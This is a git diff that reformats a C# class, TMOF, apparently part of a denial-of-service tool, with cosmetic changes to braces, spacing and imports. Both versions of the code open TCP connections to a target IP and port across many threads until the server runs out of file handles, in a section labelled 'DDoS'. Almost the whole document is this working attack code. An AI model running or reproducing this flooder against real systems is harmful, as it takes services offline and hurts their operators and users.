@@ -1,7 +1,4 @@
-﻿using System;
-using System.Collections.Generic;
-using System.Text;
-using System.Net;
+﻿using System.Net;
 using System.Net.Sockets;
 using System.Threading;
 namespace GAS.Core
@@ -11,49 +8,43 @@ namespace GAS.Core
     /// and causes "Too Many Open Files" error
     /// i'm  not sure it wotks well
     /// </summary>
-    class TMOF:IAttacker
+    class TMOF : IAttacker
     {
         byte[] handshake = new byte[] { 1, 2, 3 };
         IPAddress _ip = IPAddress.Loopback;
         bool init = false;
         private Thread[] WorkingThreads;
         volatile int msockets = int.MaxValue;
-        public TMOF(string ip, int port, int threadcount, int max_sockets_on_attacker)
-        {
+        public TMOF(string ip, int port, int threadcount, int max_sockets_on_attacker) {
             this.Target = ip;
             this.Port = port;
             this.ThreadCount = threadcount;
             this.msockets = max_sockets_on_attacker;
             WorkingThreads = new Thread[ThreadCount];
         }
-        public override void Start()
-        {
-            if (IsFlooding)
+        public override void Start() {
+            if ( IsFlooding )
                 Stop();
             IsFlooding = true;
-            for (int i = 0; i < ThreadCount; i++)
-                (WorkingThreads[i] = new Thread(new ParameterizedThreadStart(bw_DoWork))).Start(i);
+            for ( int i = 0; i < ThreadCount; i++ )
+                ( WorkingThreads[i] = new Thread(new ParameterizedThreadStart(bw_DoWork)) ).Start(i);
             init = true;
         }
-        private void bw_DoWork(object indexinthreads)
-        {
+        private void bw_DoWork(object indexinthreads) {
             #region Wait 4 init
-            while (!init) Thread.Sleep(100);
-            int MY_INDEX_FOR_WORK = (int) indexinthreads;
+            while ( !init ) Thread.Sleep(100);
+            int MY_INDEX_FOR_WORK = (int)indexinthreads;
             #endregion
             #region DDoS
-            try
-            {
+            try {
                 int csockets = 0;
-                while (IsFlooding)
-                {
-                    while (csockets > msockets)
+                while ( IsFlooding ) {
+                    while ( csockets > msockets )
                         Thread.Sleep(100);
-                    try
-                    {
+                    try {
                         csockets++;
                         rSocket s = new rSocket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
-                        s.NoDelay=  true;
+                        s.NoDelay = true;
                         s.Connect(Target, Port);
                         s.Shutdown(SocketShutdown.Receive);
                         s.Send(handshake);
@@ -66,8 +57,7 @@ namespace GAS.Core
             catch { }
             #endregion
         }
-        public override void Stop()
-        {
+        public override void Stop() {
             IsFlooding = false;
         }
     }
